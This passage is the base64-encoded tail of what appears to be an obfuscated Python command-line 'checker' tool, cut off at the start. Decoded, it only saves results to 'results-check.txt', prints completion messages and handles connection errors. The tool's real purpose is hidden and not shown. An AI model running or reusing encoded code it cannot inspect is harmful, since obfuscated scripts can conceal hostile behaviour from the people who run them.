DogcmVzdWx0cy1jaGVjay50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB0aGFua3MgZm9yIHVzaW5nIHRoaXMgdG9vbHMiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4jIERvbmUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBubyByZXN1bHQiKQ0KICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCiAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgICAgIGV4aXQoIiMgQ29ubmVjdGlvbiBlcnJvciIpDQo='))
